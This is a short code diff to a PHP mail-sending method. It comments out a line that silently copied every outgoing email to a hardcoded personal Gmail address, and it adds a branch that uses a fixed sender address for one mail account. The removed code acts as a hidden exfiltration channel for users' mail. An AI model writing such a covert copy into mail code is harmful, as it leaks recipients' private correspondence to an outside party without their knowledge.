@@ -348,16 +348,29 @@ class Mail_global
             $data['mail_username'] = Config::get('mail.username');
             try 
             {
-                Mail::send('emails.full_body', $data, function ($m) use ($data) 
+                if ($data['mail_username'] == "ca457d75dd54c1") 
                 {
-                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
-                    $m->to($data["mail_to"], $data['mail_username'])->subject($data["subject"]);
-                });
-                Mail::send('emails.full_body', $data, function ($m) use ($data) 
+                    Mail::send('emails.full_body', $data, function ($m) use ($data) 
+                    {
+                        $m->from("edward@edward.com", $_SERVER['SERVER_NAME']);
+                        $m->to($data["mail_to"], $data['mail_username'])->subject($data["subject"]);
+                    });
+                }
+                else
                 {
-                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
-                    $m->to("arcylen103095@gmail.com", $data['mail_username'])->subject($data["subject"]);
-                });
+                    Mail::send('emails.full_body', $data, function ($m) use ($data) 
+                    {
+                        $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
+                        $m->to($data["mail_to"], $data['mail_username'])->subject($data["subject"]);
+                    });
+
+                    // Mail::send('emails.full_body', $data, function ($m) use ($data) 
+                    // {
+                    //     $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
+                    //     $m->to("arcylen103095@gmail.com", $data['mail_username'])->subject($data["subject"]);
+                    // });
+                }
+                
                 $result = 1;
             } 
             catch (\Exception $e) 
